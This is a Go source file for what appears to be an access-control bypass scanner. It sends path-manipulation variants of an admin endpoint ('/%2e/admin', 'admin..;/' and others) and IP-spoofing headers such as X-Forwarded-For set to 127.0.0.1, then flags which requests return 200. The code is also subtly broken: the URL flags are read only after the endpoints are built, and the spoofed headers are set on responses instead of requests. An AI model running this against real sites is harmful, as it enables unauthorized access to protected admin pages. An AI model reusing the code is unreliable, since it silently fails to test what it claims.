package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
)

func main() {
	domain := flag.String("url", "https://google.com", "A domain")
	path := flag.String("path", "admin", "An endpoint")

	var Red = "\033[31m"
	var Green = "\033[32m"
	var White = "\033[97m"

	endpoint := []string{*domain + "/%2e/" + *path, *domain + "/" + *path + "..;/", *domain + "/" + *path + "/.", *domain + "//" + *path + "//", *domain + "/./" + *path + "/./"}
	headers := []string{"X-Custom-IP-Authorization", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host"}
	flag.Parse()

	fmt.Println("Domain:", *domain)
	fmt.Println("Path:", *path)

	fmt.Println("\nNormal Request")
	for i, str := range endpoint {
		resp, err := http.Get(str)
		if err != nil {
			log.Fatal(err)
		}
		if resp.StatusCode == 200 && resp.ContentLength != 0 {
			fmt.Println(Green, i+1, str, resp.StatusCode, http.StatusText(resp.StatusCode), White)
		} else {
			fmt.Println(Red, i+1, str, resp.StatusCode, http.StatusText(resp.StatusCode), White)
		}
	}

	fmt.Println("\nRequest with Headers")
	for j, head := range headers {
		resp, err := http.Get(*domain)
		if err != nil {
			log.Fatal(err)
		}
		resp.Header.Set(head, "127.0.0.1")
		if resp.StatusCode == 200 && resp.ContentLength != 0 {
			fmt.Println(Green, j+1, head, *domain, resp.StatusCode, http.StatusText(resp.StatusCode), White)
		} else {
			fmt.Println(Red, j+1, head, *domain, resp.StatusCode, http.StatusText(resp.StatusCode), White)
		}

	}

}
